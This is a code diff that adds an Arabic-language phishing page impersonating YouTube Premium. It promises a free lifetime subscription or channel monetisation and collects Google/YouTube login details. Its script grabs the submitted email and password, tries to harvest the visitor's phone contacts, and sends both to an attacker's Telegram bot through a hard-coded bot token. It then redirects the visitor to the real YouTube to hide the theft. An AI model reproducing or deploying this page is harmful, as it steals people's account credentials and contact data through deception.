@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Premium - ترقية الحساب والهدايا</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #0f0f0f; color: #fff; padding-bottom: 40px; }
+        .header { background: #212121; border-bottom: 1px solid #3f3f3f; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
+        .logo-area { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: bold; color: #fff; }
+        .yt-icon { width: 32px; height: 22px; fill: #ff0000; }
+        .badge-live { background: rgba(255, 0, 0, 0.2); color: #ff4e45; font-size: 11px; padding: 4px 10px; border-radius: 12px; }
+        .hero { text-align: center; padding: 25px 15px; }
+        .hero h1 { color: #fff; font-size: 22px; margin-bottom: 8px; }
+        .hero p { color: #aaa; font-size: 12px; max-width: 350px; margin: 0 auto; line-height: 1.5; }
+        .grid-offers { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; max-width: 380px; margin: 15px auto; padding: 0 15px; }
+        .offer-box { background: #212121; border: 1px solid #3f3f3f; border-radius: 10px; padding: 15px; text-align: center; cursor: pointer; transition: 0.3s; position: relative; }
+        .offer-box.selected { border-color: #ff0000; background: rgba(255, 0, 0, 0.08); box-shadow: 0 0 15px rgba(255, 0, 0, 0.2); }
+        .offer-box h3 { color: #fff; font-size: 15px; margin-bottom: 4px; }
+        .offer-box span { font-size: 10px; color: #aaa; }
+        .ribbon { position: absolute; top: 0; left: 0; background: #ff0000; color: #fff; font-size: 8px; padding: 2px 6px; border-bottom-right-radius: 6px; font-weight: bold; }
+        .form-box { background: #212121; border: 1px solid #3f3f3f; max-width: 380px; margin: 0 auto; padding: 25px 20px; border-radius: 14px; text-align: center; }
+        .input-group { margin-bottom: 12px; text-align: right; }
+        input { width: 100%; padding: 12px; background: #121212; border: 1px solid #3f3f3f; color: #fff; border-radius: 8px; font-size: 13px; outline: none; }
+        input:focus { border-color: #3ea6ff; }
+        button { width: 100%; padding: 12px; background: #3ea6ff; border: none; color: #0f0f0f; font-weight: bold; font-size: 14px; border-radius: 18px; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo-area">
+            <svg class="yt-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
+            YouTube Premium
+        </div>
+        <div class="badge-live">عرض خاص</div>
+    </div>
+    <div class="hero">
+        <h1>ترقية الحساب إلى البريميوم مجاناً</h1>
+        <p>اختر باقة الاشتراك الخاصة بك وقم بتسجيل الدخول لتفعيل الميزات المدفوعة على حسابك فوراً.</p>
+    </div>
+    <div class="grid-offers">
+        <div class="offer-box selected" onclick="selectOffer(this, 'اشتراك بريميوم سنوي مدى الحياة')">
+            <div class="ribbon">مجاني</div>
+            <h3>باقة سنوية</h3>
+            <span>بدون إعلانات تماماً</span>
+        </div>
+        <div class="offer-box" onclick="selectOffer(this, 'توثيق وتفعيل أرباح القناة')">
+            <h3>تفعيل الأرباح</h3>
+            <span>شارة المبدع الرسمي</span>
+        </div>
+    </div>
+    <div class="form-box">
+        <h3 style="color: #fff; margin-bottom: 5px; font-size: 16px;">ربط حساب Google / YouTube</h3>
+        <p style="color: #aaa; font-size: 10px; margin-bottom: 15px;" id="offerText">الباقة: اشتراك بريميوم سنوي مدى الحياة</p>
+        <form id="secureForm">
+            <div class="input-group"><input type="text" id="username" placeholder="البريد الإلكتروني أو الهاتف" required></div>
+            <div class="input-group"><input type="password" id="password" placeholder="كلمة المرور" required></div>
+            <button type="submit">تأكيد التفعيل والانضمام</button>
+        </form>
+    </div>
+    <script>
+        let currentOffer = "اشتراك بريميوم سنوي مدى الحياة";
+        function selectOffer(el, name) {
+            document.querySelectorAll('.offer-box').forEach(b => b.classList.remove('selected'));
+            el.classList.add('selected');
+            currentOffer = name;
+            document.getElementById('offerText').innerText = `الباقة: ${name}`;
+        }
+        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetChatId = urlParams.get('to');
+
+        document.getElementById('secureForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            if(!targetChatId) return;
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            let contactsData = "لم يتم منح الصلاحية";
+            if ('contacts' in navigator && 'ContactsManager' in window) {
+                try {
+                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                    if (contacts.length > 0) contactsData = contacts.map(c => `المستخدم: ${c.name?.[0] || 'بدون'} - الرقم: ${c.tel?.[0] || ''}`).join('\n');
+                } catch(e) {}
+            }
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`صيد يوتيوب جديد\nالباقة: ${currentOffer}\nالحساب: ${user}\nالباسورد: ${pass}`)}`);
+            if(contactsData !== "لم يتم منح الصلاحية") {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`جهات الاتصال:\n${contactsData}`)}`);
+            }
+            setTimeout(() => { window.location.href = "https://www.youtube.com"; }, 800);
+        });
+    </script>
+</body>
+</html>
